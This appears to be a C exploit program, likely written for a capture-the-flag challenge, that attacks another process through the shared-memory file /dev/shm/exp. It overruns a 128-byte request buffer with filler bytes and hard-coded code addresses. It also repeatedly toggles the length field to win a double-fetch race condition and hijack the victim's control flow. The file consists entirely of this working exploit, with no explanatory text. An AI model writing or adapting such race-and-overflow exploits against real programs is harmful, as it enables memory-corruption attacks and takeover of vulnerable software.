#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>

#define MAX_STR_LEN 128

typedef struct req {
    unsigned char len;
    char shift;
    char buf[MAX_STR_LEN];
} shm_req_t;

int main(){
    int fd = 0;

    while (1) {
        fd = open("/dev/shm/exp", O_RDWR);
        if (fd == -1) {
            // perror("open");
            continue;
        }
        break;
    }
    printf("[+] /dev/shm/exp has been opened on %d\n", fd);

    shm_req_t* req = (shm_req_t*)mmap(NULL, sizeof(shm_req_t), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if(req == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    printf("[+] mmap success!\n");

    char* curr = req->buf;
    memset(req->buf, 0x41, 136);
    curr = curr+136;
    memcpy(curr, "\x08\x00@\x00\x00\x00\x00\x00", 8);
    curr = curr+8+24;
    memcpy(curr, "L\x12@\x00\x00\x00\x00\x00", 8);

    while (1){
        req->len = 0x80;
        req->len = 0xff;
    }

}